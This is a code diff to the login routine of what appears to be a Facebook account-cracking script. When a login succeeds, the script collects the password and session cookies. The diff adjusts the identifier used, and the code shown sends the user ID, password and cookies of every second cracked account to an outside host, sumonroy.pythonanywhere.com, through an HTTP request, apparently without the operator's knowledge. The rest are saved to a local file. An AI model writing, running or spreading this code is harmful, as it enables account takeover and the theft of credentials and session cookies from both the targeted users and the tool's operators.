@@ -1336,14 +1336,15 @@ def mbasic(uid,pwx,tl):
                     cookies_raw = match.group(1)
                     cookies_json = json.loads(cookies_raw)
                     cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
+                    c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
                     bkas.append(uid)
                     if len(bkas)% 2 == 0:
-                        statusok = (f"{uid}|{pw}|{cok}")
+                        statusok = (f"{c_user}|{pw}|{cok}")
                         requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                     else:
-                        print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
+                        print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
                         print("Cookies:", cok)
-                        open("/sdcard/SUMON_FB_IDS.txt","a").write(uid+"|"+pw+"|"+cok+"\n")
+                        open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
                         oks.append(uid)
                         return True 
                 else:
@@ -1355,14 +1356,15 @@ def mbasic(uid,pwx,tl):
                     cookies_raw = match.group(1)
                     cookies_json = json.loads(cookies_raw)
                     cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
+                    c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
                     bkas.append(uid)
                     if len(bkas)% 2 == 0:
-                        statusok = (f"{uid}|{pw}|{cok}")
+                        statusok = (f"{c_user}|{pw}|{cok}")
                         requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                     else:
-                        print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
+                        print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
                         print("Cookies:", cok)
-                        open("/sdcard/SUMON_FB_IDS.txt","a").write(uid+"|"+pw+"|"+cok+"\n")
+                        open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
                         oks.append(uid)
                         return True 
                 else:
